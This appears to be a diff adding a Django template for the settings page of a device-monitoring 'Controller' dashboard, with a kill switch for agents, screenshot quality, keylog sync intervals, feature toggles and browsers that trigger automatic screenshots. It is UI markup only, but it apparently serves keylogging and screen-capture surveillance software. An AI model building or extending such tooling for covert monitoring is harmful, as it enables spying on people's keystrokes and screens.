@@ -1,0 +1,146 @@
+{% extends 'base.html' %}
+
+{% block title %}Settings - Controller{% endblock %}
+{% block page_title %}Settings{% endblock %}
+
+{% block content %}
+<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 24px;">
+    <!-- Global Settings -->
+    <div class="card fade-in">
+        <div class="card-header">
+            <h3 class="card-title">Global Settings</h3>
+        </div>
+        <div class="card-body">
+            <form method="post" action="{% url 'settings' %}">
+                {% csrf_token %}
+                
+                <div style="margin-bottom: 24px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md); margin-bottom: 12px; border: 1px solid {% if global_kill_switch %}var(--danger){% else %}var(--border-color){% endif %};">
+                        <div>
+                            <div style="font-weight: 500; {% if global_kill_switch %}color: var(--danger);{% endif %}">
+                                <i class="ph ph-warning-circle" style="margin-right: 8px;"></i>
+                                Global Kill Switch
+                            </div>
+                            <div style="font-size: 12px; color: var(--text-muted); margin-top: 4px;">Disable all agents immediately</div>
+                        </div>
+                        <label style="position: relative; display: inline-block; width: 52px; height: 28px;">
+                            <input type="checkbox" name="global_kill_switch" {% if global_kill_switch %}checked{% endif %} style="opacity: 0; width: 0; height: 0;">
+                            <span class="toggle-slider" style="position: absolute; cursor: pointer; inset: 0; background: {% if global_kill_switch %}var(--danger){% else %}#374151{% endif %}; border-radius: 28px; transition: 0.3s;">
+                                <span style="position: absolute; height: 20px; width: 20px; left: {% if global_kill_switch %}28px{% else %}4px{% endif %}; bottom: 4px; background: white; border-radius: 50%; transition: 0.3s;"></span>
+                            </span>
+                        </label>
+                    </div>
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px;">Default Screenshot Quality</label>
+                    <input type="number" name="screenshot_quality" value="{{ default_config.screenshot_quality|default:75 }}" min="10" max="100" style="width: 100%; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 12px; color: var(--text-primary); font-size: 14px;">
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px;">Config Sync Interval (seconds)</label>
+                    <input type="number" name="sync_interval" value="{{ default_config.config_sync_interval|default:600 }}" min="60" style="width: 100%; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 12px; color: var(--text-primary); font-size: 14px;">
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px;">Keylog Sync Interval (seconds)</label>
+                    <input type="number" name="keylog_interval" value="{{ default_config.keylog_sync_interval|default:300 }}" min="60" style="width: 100%; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 12px; color: var(--text-primary); font-size: 14px;">
+                </div>
+                
+                <button type="submit" class="btn btn-primary" style="width: 100%;">
+                    <i class="ph ph-floppy-disk"></i>
+                    Save Settings
+                </button>
+            </form>
+        </div>
+    </div>
+    
+    <!-- Feature Toggles -->
+    <div class="card fade-in">
+        <div class="card-header">
+            <h3 class="card-title">Default Feature Toggles</h3>
+        </div>
+        <div class="card-body">
+            <form method="post" action="{% url 'settings' %}">
+                {% csrf_token %}
+                <input type="hidden" name="form_type" value="features">
+                
+                {% for feature in features %}
+                <div style="display: flex; justify-content: space-between; align-items: center; padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md); margin-bottom: 12px;">
+                    <div>
+                        <div style="font-weight: 500;">{{ feature.name }}</div>
+                        <div style="font-size: 12px; color: var(--text-muted);">{{ feature.description }}</div>
+                    </div>
+                    <label style="position: relative; display: inline-block; width: 52px; height: 28px;">
+                        <input type="checkbox" name="{{ feature.key }}" {% if feature.enabled %}checked{% endif %} style="opacity: 0; width: 0; height: 0;" onchange="this.parentElement.querySelector('.toggle-slider').style.background = this.checked ? 'var(--success)' : '#374151'; this.parentElement.querySelector('.toggle-slider span').style.left = this.checked ? '28px' : '4px';">
+                        <span class="toggle-slider" style="position: absolute; cursor: pointer; inset: 0; background: {% if feature.enabled %}var(--success){% else %}#374151{% endif %}; border-radius: 28px; transition: 0.3s;">
+                            <span style="position: absolute; height: 20px; width: 20px; left: {% if feature.enabled %}28px{% else %}4px{% endif %}; bottom: 4px; background: white; border-radius: 50%; transition: 0.3s;"></span>
+                        </span>
+                    </label>
+                </div>
+                {% endfor %}
+                
+                <button type="submit" class="btn btn-primary" style="width: 100%; margin-top: 12px;">
+                    <i class="ph ph-floppy-disk"></i>
+                    Save Features
+                </button>
+            </form>
+        </div>
+    </div>
+</div>
+
+<!-- Monitored Browsers -->
+<div class="card fade-in" style="margin-top: 24px;">
+    <div class="card-header">
+        <h3 class="card-title">Monitored Browsers</h3>
+        <p style="font-size: 12px; color: var(--text-muted);">Browsers that trigger automatic screenshots</p>
+    </div>
+    <div class="card-body">
+        <form method="post" action="{% url 'settings' %}">
+            {% csrf_token %}
+            <input type="hidden" name="form_type" value="browsers">
+            
+            <div style="display: flex; flex-wrap: wrap; gap: 12px; margin-bottom: 20px;">
+                {% for browser in browsers %}
+                <label style="display: flex; align-items: center; gap: 8px; padding: 12px 16px; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-md); cursor: pointer; transition: all 0.2s;" onmouseover="this.style.borderColor='var(--accent-primary)'" onmouseout="this.style.borderColor='var(--border-color)'">
+                    <input type="checkbox" name="browsers" value="{{ browser.name }}" {% if browser.enabled %}checked{% endif %} style="width: 18px; height: 18px; accent-color: var(--accent-primary);">
+                    <span style="font-size: 14px;">{{ browser.display }}</span>
+                </label>
+                {% endfor %}
+            </div>
+            
+            <button type="submit" class="btn btn-primary">
+                <i class="ph ph-floppy-disk"></i>
+                Save Browsers
+            </button>
+        </form>
+    </div>
+</div>
+
+<!-- Server Info -->
+<div class="card fade-in" style="margin-top: 24px;">
+    <div class="card-header">
+        <h3 class="card-title">Server Information</h3>
+    </div>
+    <div class="card-body">
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px;">
+            <div style="padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md);">
+                <div style="font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">Version</div>
+                <div style="font-size: 16px; font-weight: 500;">1.0.0</div>
+            </div>
+            <div style="padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md);">
+                <div style="font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">Total Devices</div>
+                <div style="font-size: 16px; font-weight: 500;">{{ total_devices }}</div>
+            </div>
+            <div style="padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md);">
+                <div style="font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">Database</div>
+                <div style="font-size: 16px; font-weight: 500;">SQLite</div>
+            </div>
+            <div style="padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md);">
+                <div style="font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">Django Version</div>
+                <div style="font-size: 16px; font-weight: 500;">4.2</div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
